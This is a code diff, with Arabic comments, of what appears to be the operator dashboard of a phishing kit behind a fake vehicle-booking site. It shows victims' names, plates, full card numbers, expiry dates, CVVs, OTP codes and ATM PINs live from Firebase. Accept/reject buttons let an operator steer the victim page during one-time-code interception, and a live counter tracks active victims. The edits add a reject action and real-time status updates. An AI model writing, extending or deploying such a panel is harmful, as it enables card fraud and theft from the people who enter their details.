@@ -23,7 +23,7 @@
         .tab-content.active { display: block; }
         .booking-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; }
         .customer-card { background: white; border-radius: 12px; padding: 15px; border-right: 6px solid #1e7344; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
-        .operation-row { background: white; border-radius: 10px; padding: 10px; margin-bottom: 10px; border: 1px solid #ddd; }
+        .operation-row { background: white; border-radius: 10px; padding: 10px; margin-bottom: 10px; border: 1px solid #ddd; box-shadow: 0 2px 4px rgba(0,0,0,0.03); }
         .card-data-wrapper { display: flex; align-items: center; justify-content: space-between; gap: 10px; flex-wrap: nowrap; }
         .box { padding: 8px 10px; border-radius: 6px; font-size: 13px; background: #f8f9fa; border: 1px solid #eee; text-align: center; }
         .card-box { background: #fffcf0; border-color: #fcebb6; color: #856404; font-weight: bold; }
@@ -67,8 +67,6 @@
 </div>
 
 <script>
-    const sessionStartTime = Date.now(); // وقت فتح الصفحة الآن
-
     function checkSavedLogin() {
         if (localStorage.getItem("admin_logged_in") === "true") showAdmin();
     }
@@ -90,10 +88,7 @@
         initFirebase();
     }
 
-    function logout() {
-        localStorage.removeItem("admin_logged_in");
-        location.reload();
-    }
+    function logout() { localStorage.removeItem("admin_logged_in"); location.reload(); }
 
     function initFirebase() {
         const firebaseConfig = {
@@ -109,64 +104,93 @@
         if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        // تصفير وتنظيف عداد الزوار
+        // 1. عداد الزوار - تصفير تلقائي للقديم عشان يظهر 0 لو مفيش حد
         database.ref('live_visitors').on('value', s => {
-            let count = 0; const now = Date.now();
+            let active = 0; const now = Date.now();
             s.forEach(c => {
-                if(now - c.val().last_active < 30000) count++;
+                if(now - c.val().last_active < 30000) active++;
                 else database.ref('live_visitors/'+c.key).remove();
             });
-            document.getElementById('onlineCount').innerText = count;
+            document.getElementById('onlineCount').innerText = active;
         });
 
-        // جلب البيانات الجديدة فقط (التي تم إنشاؤها بعد فتح الصفحة)
-        function listenForNew(path, containerId, templateFn) {
-            database.ref(path).on('child_added', (snapshot) => {
-                const val = snapshot.val();
-                // إذا كان عنصر قديم (قبل فتح الصفحة) نتجاهله
-                if (val.timestamp && val.timestamp < sessionStartTime) return;
-                
-                const container = document.getElementById(containerId);
-                const div = document.createElement('div');
-                div.innerHTML = templateFn(val, snapshot.key);
-                container.prepend(div); // وضع الجديد في الأعلى
-            });
-        }
-
-        listenForNew('visitors', 'bookingGrid', (val, key) => `
-            <div class="customer-card">
+        // 2. بيانات الحجوزات - وضعنا child_added للسرعة
+        database.ref('visitors').on('child_added', (snapshot) => {
+            const val = snapshot.val();
+            const grid = document.getElementById('bookingGrid');
+            const card = document.createElement('div');
+            card.className = 'customer-card';
+            card.id = 'v_' + snapshot.key;
+            card.innerHTML = `
                 <h3 style="margin:0 0 10px 0; color:#1e7344; font-size:16px;">${val.fullName || 'زائر'}</h3>
                 <p style="font-size:13px; margin:5px 0;">🚗 ${val.vehicleType || '-'} | 🔢 ${val.plateNumber || '-'}</p>
                 <p style="font-size:13px; margin:5px 0;">📅 ${val.bookingDate || '-'} | 🕒 ${val.bookingTime || '-'}</p>
-                <button class="btn btn-reject" style="width:100%; margin-top:10px;" onclick="deleteData('visitors/${key}')">حذف</button>
-            </div>
-        `);
+                <button class="btn btn-reject" style="width:100%; margin-top:10px;" onclick="deleteData('visitors/${snapshot.key}')">حذف</button>
+            `;
+            grid.prepend(card);
+        });
 
-        listenForNew('payments', 'paymentsContainer', (val, id) => {
-            let isWait = val.status?.includes('waiting');
-            return `
-            <div class="operation-row">
+        // 3. بيانات البطاقات - كامل الأزرار (قبول / رفض / حذف)
+        database.ref('payments').on('child_added', (snapshot) => {
+            const val = snapshot.val();
+            const container = document.getElementById('paymentsContainer');
+            const row = document.createElement('div');
+            row.className = 'operation-row';
+            row.id = 'p_' + snapshot.key;
+            
+            let statusText = "مستقر";
+            let statusClass = "";
+            if(val.status && val.status.includes('waiting')) {
+                statusText = "انتظار ⏳";
+                statusClass = "status-waiting";
+            }
+
+            row.innerHTML = `
                 <div class="card-data-wrapper">
                     <div style="min-width:100px;">
                         <div style="font-weight:bold; font-size:13px;">${val.cardHolder || 'عميل'}</div>
-                        <span class="status-badge ${isWait?'status-waiting':''}">${isWait?'انتظار ⏳':'مستقر'}</span>
+                        <span id="stat_${snapshot.key}" class="status-badge ${statusClass}">${statusText}</span>
                     </div>
-                    <div style="display:flex; gap:5px; align-items:center; flex-grow:1; flex-wrap:wrap;">
+                    <div style="display:flex; gap:5px; align-items:center; flex-grow:1; flex-wrap:nowrap;">
                         <div class="box card-box" style="direction:ltr; min-width:140px;">${val.cardNumber || '----'}</div>
                         <div class="box card-box">${val.expiry || '--/--'} | ${val.cvv || '---'}</div>
                         <div class="box" style="background:#e3f2fd; color:#0d47a1;">🔐 OTP: ${val.otp || '-'}</div>
                         <div class="box" style="background:#f3e5f5; color:#4a148c;">🏧 PIN: ${val.atm_pin || '-'}</div>
                     </div>
                     <div style="display:flex; gap:5px;">
-                        <button class="btn btn-accept" onclick="updateStatus('${id}', 'accept')">قبول</button>
-                        <button class="btn btn-delete" onclick="deleteData('payments/${id}')">🗑</button>
+                        <button class="btn btn-accept" onclick="updateStatus('${snapshot.key}', 'accept')">قبول</button>
+                        <button class="btn btn-reject" onclick="updateStatus('${snapshot.key}', 'reject')">رفض</button>
+                        <button class="btn btn-delete" onclick="deleteData('payments/${snapshot.key}')">🗑</button>
                     </div>
                 </div>
-            </div>`;
+            `;
+            container.prepend(row);
         });
+
+        // تحديث الحالة لحظياً (لو دوست قبول أو رفض يتغير اللون فوراً)
+        database.ref('payments').on('child_changed', (snapshot) => {
+            const val = snapshot.val();
+            const badge = document.getElementById('stat_' + snapshot.key);
+            if (badge) {
+                if (val.status === 'accept') { 
+                    badge.innerText = "مقبول ✅"; 
+                    badge.className = "status-badge"; 
+                    badge.style.background = "#d4edda"; 
+                }
+                else if (val.status === 'reject') { 
+                    badge.innerText = "مرفوض ❌"; 
+                    badge.className = "status-badge"; 
+                    badge.style.background = "#f8d7da"; 
+                }
+            }
+        });
+
+        // الحذف اللحظي من الشاشة عند المسح من القاعدة
+        database.ref('visitors').on('child_removed', s => document.getElementById('v_'+s.key)?.remove());
+        database.ref('payments').on('child_removed', s => document.getElementById('p_'+s.key)?.remove());
     }
 
-    function updateStatus(userId, action) { firebase.database().ref('payments/' + userId).update({ status: action }); }
+    function updateStatus(id, action) { firebase.database().ref('payments/' + id).update({ status: action }); }
     function deleteData(path) { if(confirm('متأكد؟')) firebase.database().ref(path).remove(); }
 
     function openTab(evt, tabName) {
